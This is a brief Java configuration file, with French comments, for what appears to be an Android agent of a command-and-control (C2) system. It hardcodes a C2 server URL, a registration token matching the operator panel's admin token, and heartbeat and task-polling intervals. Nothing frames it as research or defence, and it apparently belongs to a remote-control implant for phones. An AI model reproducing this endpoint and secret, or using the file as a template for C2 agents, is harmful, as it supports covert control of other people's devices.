package com.bmu.agent;

public class Config {
    // URL du serveur C2
    public static final String C2_URL = "https://client1.hotspot1.uk";

    // Token d'enregistrement (doit correspondre au token admin du panel)
    public static final String REGISTER_TOKEN = "7d477dcbc3d3416abc18a39df2d9f4327c72d1d5f49e43d982a773f4b16227e6";

    // Intervalle de heartbeat en millisecondes (10 secondes)
    public static final long HEARTBEAT_INTERVAL = 10000;

    // Intervalle de poll des tâches (5 secondes)
    public static final long TASK_POLL_INTERVAL = 5000;

    // Nom affiché dans le panel
    public static final String AGENT_TYPE = "android";
}
